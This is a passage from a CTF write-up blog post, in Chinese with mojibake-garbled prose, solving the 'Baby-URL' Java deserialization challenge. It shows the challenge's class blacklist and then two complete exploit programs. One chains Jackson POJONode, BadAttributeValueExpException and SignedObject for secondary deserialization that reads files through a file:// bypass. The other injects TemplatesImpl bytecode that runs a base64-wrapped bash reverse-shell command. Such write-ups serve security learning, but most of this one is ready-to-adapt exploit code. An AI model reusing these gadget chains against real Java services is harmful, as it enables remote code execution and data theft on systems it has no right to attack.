class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String url;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">visiter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLHelper</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-built_in">this</span>.url = url;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.visiter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.visiter.visitUrl(<span class="hljs-built_in">this</span>.url);<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                file.createNewFile();<br>            &#125;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(result.getBytes());<br>            fos.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLVisitor.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLVisiter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLVisiter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">visitUrl</span><span class="hljs-params">(String myurl)</span> &#123;<br>        <span class="hljs-keyword">if</span> (myurl.startsWith(<span class="hljs-string">&quot;file&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file protocol is not allowed&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(myurl);<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(url.openStream()));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                String inputLine;<br>                <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    sb.append(inputLine);<br>                &#125;<br><br>                in.close();<br>                <span class="hljs-keyword">return</span> sb.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>                <span class="hljs-keyword">return</span> e.toString();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦æ‰“&#x2F;hackè·¯ç”±ååºåˆ—åŒ–è¿›å»ï¼Œ&#x2F;fileå°±æ˜¯ä¸€ä¸ªè¯»æ–‡ä»¶çš„åŠŸèƒ½ã€‚å†çœ‹ä¸¤ä¸ªURLè‡ªå®šä¹‰æ¨¡æ¿ç±»ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿äº†Serializableæ¥å£ã€‚</p><p>URLHelperé‡å†™äº†readObjectæ–¹æ³•ï¼Œå³ä¸ºå…¥å£ç±»ã€‚è°ƒç”¨äº†ä»»æ„ç±»çš„visitUrlæ–¹æ³•ï¼Œå¹¶æŠŠç»“æœå†™è¿›æ–‡ä»¶é‡Œã€‚</p><p>URLVisiteré€šè¿‡æŒ‡å®šurlè®¿é—®å…¶å†…éƒ¨èµ„æºç„¶åè¿”å›ã€‚</p><p>åªä¸è¿‡æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯&#x2F;hackè·¯ç”±çš„ååºåˆ—åŒ–éƒ¨åˆ†ï¼Œå®ƒä½¿ç”¨çš„æ˜¯è‡ªå®šä¹‰çš„è¾“å…¥æµçš„ç±»<code>MyObjectInputStream</code>ã€‚è¿™ä¸ªç±»é‡å†™äº†<code>resolveClass</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠInetAddressã€CCé“¾banäº†ï¼Œç”šè‡³æŠŠä»–è‡ªå·±å†™çš„URLVisitorå’ŒURLHelperç»™banäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¼•å…¥ç¬¬ä¸€ä¸ªåšæ³•ï¼Œåº”è¯¥ä¹Ÿæ˜¯é¢„æœŸè§£ã€‚</p><h3 id="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"><a href="#SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•" class="headerlink" title="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"></a>SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•</h3><p><code>SignedObject</code>çš„äºŒæ¬¡ååºåˆ—åŒ–èƒ½å¤Ÿè®©æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨åˆ°é¢˜ç›®æä¾›çš„<code>URLHelper</code>å’Œ<code>URLVister</code>ï¼Œç„¶åæ€è·¯ä¹Ÿå¾ˆæ¸…æ™°ï¼Œå°±æ˜¯æ‰“<code>/hack</code>ååºåˆ—åŒ–ï¼Œfileçš„<code>startWith</code>ç»•è¿‡å¯ä»¥åœ¨å‰é¢åŠ ä¸ªç©ºæ ¼ï¼Œæˆ–è€…å…¨å¤§å†™ç»•è¿‡ã€‚ç¬¬ä¸€æ¬¡è¯»å–ç›®å½•å’Œæ–‡ä»¶åæ‰¾flagï¼ˆæ˜¯çš„ï¼Œfile:&#x2F;&#x2F;å¯ä»¥è¯»ç›®å½•ï¼‰ï¼Œç¬¬äºŒæ¬¡è¯»å–flagã€‚<code>/flie</code>è·¯ç”±å¯ä»¥è¯»å–åˆ°å›æ˜¾å†…å®¹ã€‚</p><p>æ‰€ä»¥Expå‘¼ä¹‹æ¬²å‡ºï¼Œç”¨<code>Jackson</code>åŸç”Ÿé“¾å¥—ä¸Š<code>SignedObject</code>æ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.PrivateKey;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot; file:///flag_eddiemurphy&quot;</span>);<br>        <span class="hljs-comment">//URLHelper urlHelper = new URLHelper(&quot; file:///&quot;);</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        setFieldValue(urlHelper, <span class="hljs-string">&quot;visiter&quot;</span>, urlVisiter);<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp, jsonNodes);<br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png" alt="image-20240803211139099"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png" alt="image-20240803211143135"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png" alt="image-20240803211146962"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png" alt="image-20240803211151783"></p><p>ç¬¬äºŒä¸ªæ–¹æ³•æ›´ç¥ï¼Œå› ä¸ºç›´æ¥RCEäº†ã€‚</p><h3 id="TemplatesImplæ¶æ„å­—èŠ‚ç "><a href="#TemplatesImplæ¶æ„å­—èŠ‚ç " class="headerlink" title="TemplatesImplæ¶æ„å­—èŠ‚ç "></a>TemplatesImplæ¶æ„å­—èŠ‚ç </h3><p>è¿™ä¸ªæ–¹æ³•ç”šè‡³ä¸éœ€è¦å®ƒçš„URLHelperå’ŒURLVisiterï¼Œç›´æ¥èƒ½åå¼¹shellã€‚</p><p>æ€è·¯æ¥æºæ˜¯AliyunCTF2023çš„Bypassit1ã€‚</p><p>ä¸å–å…³å­äº†ï¼Œç›´æ¥ä¸Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplates();<span class="hljs-comment">//ç”¨javassistè·å–</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        System.out.println(serial(val));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;MyTemplate&quot;</span>);<br>        template.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰“ä¸€æ¬¡hackå³å¯ï¼Œå› ä¸ºååºåˆ—åŒ–å·²ç»æˆåŠŸï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png" alt="image-20240803211441966"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png" alt="image-20240803211445638"></p><p>äºŒæ¬¡ååºåˆ—åŒ–çš„ç ”ç©¶æˆ‘ä¼šåç»­å†å•å¼€ä¸€ä¸ªæ–‡ç« ï¼Œå› ä¸ºä¹Ÿéå¸¸å…·æœ‰ç ”ç©¶ä»·å€¼ã€‚å¯çœ‹<a href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK4rci1LnEbD">æµ…è°ˆJavaäºŒæ¬¡ååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    
